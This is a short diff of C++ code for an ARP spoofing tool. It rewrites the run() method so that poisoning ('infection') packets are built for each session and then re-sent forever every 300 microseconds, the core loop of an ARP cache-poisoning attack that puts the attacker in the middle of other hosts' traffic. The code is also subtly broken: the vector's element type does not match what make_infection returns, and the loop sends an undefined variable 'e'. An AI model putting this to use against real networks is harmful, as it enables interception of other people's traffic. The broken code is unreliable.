@@ -7,12 +7,22 @@ Ethernet ArpSpoofer::make_infection(session sess) {
     return ether;
 }
 
-void ArpSpoofer::run() 
+void ArpSpoofer::run()
 {
-    for(auto sess : sessions)
-    {
-        auto e = make_infection(sess);
-        arp_sender.send_packet(e.serialize());
+    vector<session> ifv;    
+    for (auto sess : sessions)
+        ifv.push_back(make_infection(sess));
+    
+    if( not pdus.empty() ) {
+        for(PDU* a : pdus) {
+            arp_sender.send_packet(a->serialize());
+        }
+    }
+
+    while (true) {
+        for (auto vir : ifv)
+            arp_sender.send_packet(e.serialize());
+        usleep(300);
     }
 }
 
